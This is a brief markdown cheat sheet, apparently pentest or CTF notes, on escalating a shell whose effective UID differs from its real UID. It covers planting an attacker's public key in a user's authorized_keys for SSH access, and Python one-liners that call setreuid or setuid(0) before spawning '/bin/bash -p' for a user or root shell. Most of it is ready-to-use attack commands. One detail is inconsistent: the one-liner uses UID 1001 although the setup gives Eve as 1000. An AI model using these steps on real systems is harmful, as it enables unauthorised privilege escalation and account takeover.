# Techniques to Escape EUID Limited Shell to UID Shell

## For normal euid

1) using public key authentication technique to escape

&nbsp;&nbsp;&nbsp;&nbsp-check the .ssh if we have write permission on authorized_keys

&nbsp;&nbsp;&nbsp;&nbsp-write our own public key into the authorized_keys file

&nbsp;&nbsp;&nbsp;&nbsp-ssh into the user with our own private key

&nbsp;&nbsp;&nbsp;&nbsp//notes: the public-private key pair can be generated using ssh-keygen

2) using python to setreuid to escape

&nbsp;&nbsp;&nbsp;&nbspcurrent setup:

&nbsp;&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;&nbspeuid user: 1000(Eve)

&nbsp;&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;&nbspuid user: 33 (www-data)

&nbsp;&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;&nbsprough idea how it works executing step by step:
```
$python
>>import os
>>os.setreuid(1000,1000)	#setreuid(ruid,euid)
>>os.system("/bin/bash -p")
```
one line command:
```
$python -c 'import os;os.setreuid(1001,1001);os.system("/bin/bash -p")'
```
## For root euid

1) can use the normal euid user public key authentication technique
2) use python to setuid & escape EUID limited shell

rough idea how it works executing step by step:


```
#python
>>import os
>>os.setuid(0)
>>os.system("/bin/bash -p")
```
one line command:
```
#python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
```
